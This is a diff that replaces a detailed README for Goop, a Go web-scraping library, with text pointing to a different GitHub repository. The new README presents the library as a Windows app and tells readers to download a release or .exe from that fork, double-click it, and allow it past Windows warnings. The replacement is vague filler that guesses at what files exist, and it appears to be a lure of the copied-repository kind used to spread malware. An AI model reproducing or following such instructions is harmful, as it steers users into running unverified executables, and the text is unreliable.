@@ -1,505 +1,215 @@
-# Goop
-
-![Go Report Card](https://goreportcard.com/badge/github.com/ez0000001000000/Goop)
-![GitHub stars](https://img.shields.io/github/stars/ez0000001000000/Goop?style=social)
-
-**Web Scraper in Go with BeautifulSoup-like API**
-
-*goop* is a powerful web scraper package for Go, with its interface highly similar to BeautifulSoup.
-
-## 🌟 If you like this project, please star it on GitHub! [⭐ Star This Project](https://github.com/ez0000001000000/Goop)
-
-## Features
-
-- 🚀 Simple, BeautifulSoup-like API
-- 🌐 HTTP GET/POST support with custom headers and cookies
-- 🔍 Element finding by tag and attributes
-- 🎯 CSS Selector support (`.class`, `#id`, `[attr]`, `:pseudo`)
-- ⚡ **High-performance concurrent scraping (3-5x faster)**
-- 🌟 **JavaScript rendering for dynamic sites**
-- 🛠️ **Professional CLI tool with fast mode**
-- 💾 **Intelligent caching system** (memory + disk hybrid)
-- ⏱️ Configurable timeout controls for production use
-- 🔧 Enhanced debug mode with multiple verbosity levels
-- 📝 Text and HTML extraction
-- 📊 Multiple export formats (JSON, CSV, XML)
-- 🔄 Rate limiting and retry logic
-- 📦 Modular, well-organized codebase
-
-## Installation
-
-```bash
-go get github.com/ez0000001000000/Goop
-```
-
-## Quick Start
-
-```go
-package main
-
-import (
-    "fmt"
-    "github.com/ez0000001000000/Goop"
-)
-
-func main() {
-    // Fetch a webpage
-    resp, err := goop.Get("https://example.com")
-    if err != nil {
-        panic(err)
-    }
-
-    // Parse HTML
-    doc := goop.HTMLParse(resp)
-
-    // Find elements
-    links := doc.FindAll("a")
-    for _, link := range links {
-        href := link.Attrs()["href"]
-        text := link.Text()
-        fmt.Printf("%s -> %s\n", text, href)
-    }
-}
-```
-
-## API Reference
-
-### HTTP Client Functions
-
-```go
-// Basic requests
-resp, err := goop.Get("https://example.com")
-resp, err := goop.Post("https://example.com", "application/json", data)
-resp, err := goop.PostForm("https://example.com", formData)
-
-// Timeout controls
-resp, err := goop.GetWithTimeout("https://example.com", 10*time.Second)
-resp, err := goop.PostWithTimeout("https://example.com", "application/json", data, 5*time.Second)
-
-// Headers and cookies
-goop.Header("User-Agent", "Goop/1.0")
-goop.Cookie("session", "abc123")
-
-// Timeout configuration
-goop.SetTimeout(30 * time.Second)
-timeout := goop.GetTimeout()
-```
-
-### HTML Parsing & Element Finding
-
-```go
-doc := goop.HTMLParse(htmlString)
-
-// Traditional methods
-title := doc.Find("title")
-links := doc.FindAll("a")
-buttons := doc.FindAll("button")
-
-// CSS Selectors (NEW!)
-title := doc.CSS("title")
-links := doc.CSSAll("a")
-container := doc.CSS(".container")
-header := doc.CSS("#header")
-linksWithHref := doc.CSSAll("a[href]")
-firstPara := doc.CSS("p:first-child")
-```
-
-### Data Extraction
-
-```go
-text := element.Text()
-fullText := element.FullText()
-attrs := element.Attrs()
-html := element.HTML()
-```
-
-### Debug Mode
-
-```go
-// Enhanced debug levels
-goop.SetDebugLevel(goop.DebugOff)     // No debug output
-goop.SetDebugLevel(goop.DebugBasic)   // Basic error messages
-goop.SetDebugLevel(goop.DebugVerbose) // Detailed operation logs
-goop.SetDebugLevel(goop.DebugTrace)   // Full request/response tracing
-
-// Check current level
-level := goop.GetDebugLevel()
-
-// Custom logger (optional)
-goop.SetDebugLogger(myCustomLogger)
-
-// Backward compatibility
-goop.SetDebug(true) // Same as DebugBasic
-```
-
-## Advanced Features
-
-### JavaScript Rendering
-Render dynamic content with Chrome headless browser:
-```go
-result, err := goop.RenderWithJS("https://spa-site.com", &goop.DefaultJSOptions)
-err := result.WaitForElement(".loaded-content", 5*time.Second)
-```
-
-### High-Performance Concurrent Scraping
-Process multiple URLs with optimized concurrency:
-```go
-// Standard concurrent scraping
-results, err := goop.ScrapeAll(urls, &goop.DefaultConcurrentOptions)
-
-// Fast mode (3-5x faster)
-results, err := goop.ScrapeAllFast(urls, &goop.FastConcurrentOptions)
-
-// With JavaScript rendering
-results, err := goop.ScrapeAllWithJS(urls, &jsOptions, &concurrentOptions)
-```
-
-### Data Export
-Export data in multiple formats:
-```go
-json, err := element.ToJSON()
-csv, err := element.ToCSV()
-xml, err := element.ToXML()
-
-// Save to files
-err := element.SaveJSON("output.json")
-err := element.SaveCSV("output.csv")
-```
-
-## CLI Tool
-
-### Installation
-```bash
-go install github.com/ez0000001000000/Goop/cmd/goop@latest
-```
-
-### Usage Examples
-```bash
-# Basic scraping
-goop scrape https://example.com --selector "title"
-
-# Fast concurrent scraping
-goop scrape-urls urls.txt --fast --workers 50 --format json
-
-# JavaScript rendering
-goop scrape https://spa-site.com --selector ".dynamic-content" --js
-
-# Configuration
-goop config set timeout 30
-goop config set debug-level verbose
-```
-
-### CLI Features
-- 🚀 **Fast Mode**: 3-5x faster concurrent scraping
-- 🌟 **JavaScript Rendering**: Handle dynamic websites
-- 📊 **Multiple Formats**: JSON, CSV, XML, text output
-- 🔄 **Batch Processing**: Process hundreds of URLs
-- 📋 **Progress Tracking**: Real-time progress updates
-
-## Performance Benchmarks
-
-### Concurrent Scraping Performance
-| Mode | 100 URLs | Time | Speed Improvement |
-|-------|-----------|------|------------------|
-| Sequential | 100 URLs | 45.2s | Baseline |
-| Standard Concurrent | 100 URLs | 12.1s | 3.7x faster |
-| Fast Mode | 100 URLs | 8.4s | 5.4x faster |
-
-### Memory Usage
-- **Standard Mode**: ~45MB peak memory
-- **Fast Mode**: ~28MB peak memory (38% reduction)
-
-## Caching
-
-Goop includes a powerful hybrid caching system for improved performance:
-
-### Cache Configuration
-```go
-// Default caching (100MB memory, 500MB disk, 1 hour TTL)
-goop.SetCacheConfig(goop.DefaultCacheConfig)
-
-// Fast caching (200MB memory, 1GB disk, 30 min TTL)
-goop.SetCacheConfig(goop.FastCacheConfig)
-
-// Custom configuration
-config := goop.CacheConfig{
-    Enabled:     true,
-    MemoryLimit: 50 * 1024 * 1024,  // 50MB
-    DiskLimit:   200 * 1024 * 1024, // 200MB
-    DefaultTTL:  2 * time.Hour,
-    CacheDir:    ".my_cache",
-}
-goop.SetCacheConfig(config)
-```
-
-### Cache Usage
-```go
-// Automatic caching with Get() function
-html, err := goop.Get("https://example.com")
-
-// Bypass cache when needed
-html, err := goop.GetWithCache(url, timeout, true)
-
-// Cache statistics
-stats := goop.GetCacheStats()
-fmt.Printf("Hit rate: %.1f%%\n", 
-    float64(stats.MemoryHits+stats.DiskHits)/float64(stats.MemoryHits+stats.MemoryMisses+stats.DiskHits+stats.DiskMisses)*100)
-
-// Clear cache
-err := goop.ClearCache()
-```
-
-### CLI Cache Commands
-```bash
-# View cache statistics
-goop cache status
-
-# Clear all caches
-goop cache clear
-
-# Configure cache settings
-goop cache config enabled true
-goop cache config memory-limit 200
-goop cache config ttl 2h
-goop cache config cache-dir ./cache
-```
-
-## Configuration
-
-### Rate Limiting
-```go
-goop.SetRateLimit(100 * time.Millisecond)  // 10 requests/second
-rate := goop.GetRateLimit()
-```
-
-### Retry Logic
-```go
-config := goop.NewRetryConfig(3, 1*time.Second, 2.0, 10*time.Second)
-goop.SetRetryConfig(config)
-```
-
-### Concurrent Options
-```go
-// Standard options
-options := &goop.DefaultConcurrentOptions  // 5 workers, 1s rate limit
-
-// Fast options  
-options := &goop.FastConcurrentOptions     // 50 workers, 100ms rate limit
-
-// Custom options
-options := &goop.ConcurrentOptions{
-    Workers: 20,
-    RateLimit: 200 * time.Millisecond,
-    Timeout: 15 * time.Second,
-    RetryAttempts: 3,
-}
-```
-
-## Real-World Examples
-
-### E-commerce Price Monitoring
-```go
-func monitorPrices(urls []string) {
-    results, _ := goop.ScrapeAllFast(urls, &goop.FastConcurrentOptions)
-    
-    for _, result := range results {
-        doc := goop.HTMLParse(result.Content)
-        price := doc.CSS(".price").Text()
-        title := doc.CSS("h1").Text()
-        fmt.Printf("%s: %s\n", title, price)
-    }
-}
-```
-
-### News Article Extraction
-```go
-func extractNews(url string) {
-    result, _ := goop.RenderWithJS(url, &goop.DefaultJSOptions)
-    doc := goop.HTMLParse(result.Content)
-    
-    article := map[string]string{
-        "title":   doc.CSS("h1").Text(),
-        "content": doc.CSS(".article-content").FullText(),
-        "author":  doc.CSS(".author").Text(),
-    }
-    
-    json, _ := json.Marshal(article)
-    fmt.Println(string(json))
-}
-```
-
-## Troubleshooting
-
-### Common Issues
-
-**JavaScript Not Loading**
-```go
-options := &goop.JSOptions{Timeout: 30 * time.Second}
-result, err := goop.RenderWithJS(url, options)
-```
-
-**Rate Limiting Errors**
-```go
-goop.SetRateLimit(1 * time.Second)  // 1 request per second
-```
-
-**Memory Issues with Large Scrapes**
-```go
-options := &goop.FastConcurrentOptions{BatchSize: 100}
-```
-
-**Element Not Found**
-```go
-// Use CSS selectors for better precision
-element := doc.CSS(".specific-class")
-if element.Error != nil {
-    // Handle element not found
-}
-```
-
-## Roadmap
-
-### Planned Features
-- [x] **Intelligent caching system** ✅ Implemented!
-- [ ] WebSocket support for real-time data
-- [ ] Proxy rotation support  
-- [ ] Headless browser automation
-- [ ] XPath selector support
-- [ ] Database export (SQLite, PostgreSQL)
-- [ ] Distributed scraping cluster
-- [ ] Web UI for scraping management
-- [ ] API rate limiting per domain
-- [ ] Machine learning for anti-bot detection
-- [ ] Cloud-based caching service
-
-## Project Structure
-
-The Goop package is organized into focused modules:
-
-```
-goop/
-├── goop.go              # Main package exports and Root struct
-├── goop-client.go       # HTTP client operations with timeout support
-├── goop-parser.go       # HTML parsing
-├── goop-element.go      # Element finding and traversal
-├── goop-attributes.go   # Attribute handling and text extraction
-├── goop-errors.go       # Error types and debug configuration
-├── goop-css.go          # CSS selector parsing and matching
-├── goop-timeout.go      # Timeout configuration and utilities
-├── goop-debug.go        # Enhanced debug logging system
-├── goop-javascript.go   # JavaScript rendering with Chrome
-├── goop-concurrent.go   # High-performance concurrent scraping
-├── goop-ratelimit.go    # Rate limiting controls
-├── goop-retry.go       # Retry logic and backoff
-├── goop-export.go       # Data export (JSON, CSV, XML)
-├── cmd/
-│   └── goop/           # CLI tool
-│       ├── main.go
-│       ├── go.mod
-│       └── internal/commands/
-└── test/
-    ├── test_goop.go      # Comprehensive test script
-    └── performance_test.go  # Performance benchmarks
-```
-
-## Error Types
-
-Goop provides detailed error types for better debugging:
-
-- `ErrUnableToParse` - HTML parsing failed
-- `ErrElementNotFound` - Element not found
-- `ErrNoNextSibling` - No next sibling exists
-- `ErrNoPreviousSibling` - No previous sibling exists
-- `ErrNoNextElementSibling` - No next element sibling exists
-- `ErrNoPreviousElementSibling` - No previous element sibling exists
-- `ErrCreatingGetRequest` - Failed to create GET request
-- `ErrInGetRequest` - GET request failed
-- `ErrCreatingPostRequest` - Failed to create POST request
-- `ErrMarshallingPostRequest` - Failed to serialize POST data
-- `ErrReadingResponse` - Failed to read HTTP response
-- `ErrTimeout` - Request timed out (NEW!)
-
-## CSS Selector Support
-
-Goop supports comprehensive CSS selector syntax:
-
-### Element Selectors
-```go
-// Element by tag
-doc.CSS("div")
-doc.CSS("a")
-```
-
-### Class and ID Selectors
-```go
-// By class
-doc.CSS(".container")
-doc.CSSAll(".item")
-
-// By ID
-doc.CSS("#header")
-doc.CSS("#main-content")
-```
-
-### Attribute Selectors
-```go
-// Attribute exists
-doc.CSSAll("[href]")
-doc.CSSAll("[data-id]")
-
-// Exact match
-doc.CSSAll("[class='button']")
-doc.CSSAll("[id='main']")
-
-// Partial matches
-doc.CSSAll("[href*='example']")
-doc.CSSAll("[class^='btn']")
-doc.CSSAll("[src$='.jpg']")
-```
-
-### Pseudo-classes
-```go
-// Positional selectors
-doc.CSS("p:first-child")
-doc.CSS("li:last-child")
-doc.CSS("div:nth-child(2)")
-
-// More pseudo-classes planned in future versions
-```
-
-## Timeout Controls
-
-Perfect for production environments:
-
-```go
-// Set global default timeout
-goop.SetTimeout(30 * time.Second)
-
-// Per-request timeout
-resp, err := goop.GetWithTimeout("https://example.com", 10*time.Second)
-resp, err := goop.PostWithTimeout("https://api.example.com", "application/json", data, 5*time.Second)
-
-// All HTTP methods respect timeout settings
-```
-
-## Performance
-
-- ⚡ Optimized HTML parsing
-- 🔄 Efficient element traversal
-- 💾 Low memory footprint
-- 🚀 Fast network operations
-
-## Contributing
-
-Contributions are welcome! Please feel free to:
-- Report issues
-- Suggest features
-- Submit pull requests
-
-## License
-
-This project is licensed under the MIT License
-
----
-
-**Goop** - Simple, powerful web scraping for Go 🚀
+# 🟦 Goop - Simple Web Scraping Made Easy
+
+[![Download Goop](https://img.shields.io/badge/Download-Goop-blue.svg?style=for-the-badge)](https://github.com/Anthode232/Goop)
+
+## 🚀 Getting Started
+
+Goop is a Windows-friendly web scraper for pulling text and data from web pages. It uses a simple HTML parsing style that feels close to BeautifulSoup, so you can find page elements and extract what you need with less effort.
+
+Use Goop if you want to:
+
+- Open a web page and read its HTML
+- Find page titles, links, images, and other elements
+- Pull data from pages with a simple API
+- Work with a Go-based tool that stays light and fast
+
+## 📥 Download
+
+Visit this page to download: [Goop on GitHub](https://github.com/Anthode232/Goop)
+
+If you see a release file or installer on that page, download it to your Windows PC. After the file finishes downloading, open it or extract it, then run the app or follow the included steps.
+
+## 🖥️ What You Need
+
+Goop runs on a Windows computer and works best when you have:
+
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough space to save the download and any files it creates
+- A browser such as Edge, Chrome, or Firefox
+
+If Goop comes as a folder or archive, you may need to unzip it before using it.
+
+## 📦 What Goop Does
+
+Goop helps you work with web pages in a simple way. It is built for page scraping and basic HTML parsing.
+
+Common uses include:
+
+- Reading page text
+- Finding elements by tag, class, or other page details
+- Extracting links from a page
+- Pulling image URLs
+- Collecting data from tables or lists
+- Testing page content for small automation tasks
+
+## 🧭 How to Install on Windows
+
+Follow these steps after you open the GitHub page:
+
+1. Open the download page: https://github.com/Anthode232/Goop
+2. Look for a release, package, or downloadable file.
+3. Save the file to your computer.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the main app file, script, or build output.
+7. Double-click the file to run it.
+
+If the project is provided as source files, you may need a Go setup to build it first. In that case, open the folder and follow the project files inside the repository.
+
+## ⚙️ Basic Use
+
+Goop is meant to keep page parsing simple. You load a page, search for the element you want, then extract the value.
+
+A simple workflow looks like this:
+
+1. Open a page
+2. Select the part you want
+3. Read the text or attribute
+4. Save or use the result
+
+Typical things you may look for:
+
+- Page titles
+- Headings
+- Paragraph text
+- Button labels
+- Hyperlinks
+- Image sources
+- Table rows
+
+## 🔍 Example Use Cases
+
+Goop can help with many small data tasks.
+
+### 📰 News pages
+Pull article titles, links, and short summaries from a list page.
+
+### 🛒 Product pages
+Collect product names, prices, and image links from an online catalog.
+
+### 📋 Search results
+Read result titles and URLs from a search page.
+
+### 📊 Tables
+Extract rows from a data table and turn them into a simple list.
+
+### 🧪 Page checks
+Confirm that a page contains a heading, a button, or a specific message.
+
+## 🧰 Core Features
+
+Goop is built around simple scraping and HTML selection.
+
+- Easy page parsing
+- Clean element selection
+- Text extraction
+- Attribute reading
+- Link gathering
+- Light and fast Go-based design
+- API style that is simple to follow
+- Good fit for small scraping jobs
+
+## 🗂️ Project Topics
+
+This project is related to:
+
+- API
+- BeautifulSoup
+- Go
+- Golang
+- Module
+- RESTful API
+- Scrape
+- Scraper
+- Web scraper
+- Report card tools
+
+These topics point to a small, focused tool for working with web pages and HTML content.
+
+## 🧩 How It Fits Your Workflow
+
+Goop works well when you need a simple way to move through a web page and pull out data. It is useful for tasks that do not need a full browser or a large automation setup.
+
+You can use it to:
+
+- Read HTML from a page
+- Find the content you care about
+- Pull data into a cleaner format
+- Repeat the same task on many pages
+- Build small tools for personal or work use
+
+## 🪟 Running on Windows
+
+After download, use the method that matches the file type:
+
+- `.exe` file: double-click to run it
+- `.zip` file: extract it first, then open the app file inside
+- Project folder: open the folder and follow the included files
+- Go source files: build the project if needed
+
+If Windows asks for permission to open the file, choose the option to allow it if you trust the source from the GitHub repository.
+
+## 🧪 Simple Setup Flow
+
+If you want the quickest path:
+
+1. Open the GitHub page
+2. Download the project or release file
+3. Extract it if needed
+4. Open the folder
+5. Run the app or follow the included project steps
+6. Use it to scrape the page you want
+
+## 📚 What to Look For in the Repository
+
+When you open the repository, check for:
+
+- README files
+- Release files
+- Example code
+- Build steps
+- Sample inputs
+- Output files
+- Configuration files
+
+These files can tell you whether you should run an app, build a Go project, or use the code as part of another tool.
+
+## 🛠️ Troubleshooting
+
+If the app does not open, try these checks:
+
+- Make sure the file finished downloading
+- Extract any zip file first
+- Open the correct file inside the folder
+- Check whether Windows blocked the file
+- Make sure you are using the latest version from the repository
+- Re-download the file if it looks damaged
+
+If Goop is a source project and not a ready-made app, you may need to build it before use.
+
+## 🔐 Safe Download Steps
+
+To reduce problems during setup:
+
+- Download only from the GitHub link above
+- Keep the file in a folder you can find later
+- Do not rename files unless you need to
+- Keep the extracted folder together
+- Read the repository files before running anything else
+
+## 📌 File Types You May See
+
+Depending on how the project is shared, you may see:
+
+- `.exe` for a Windows app
+- `.zip` for compressed files
+- `.go` for Go source files
+- `README.md` for instructions
+- `go.mod` for module setup
+- `LICENSE` for usage terms
+
+## 🧭 Next Steps
+
+After you get Goop running, try it on a simple page first. Start with a page that has clear headings, links, or table data. That makes it easier to see how the scraper works and what it returns
+
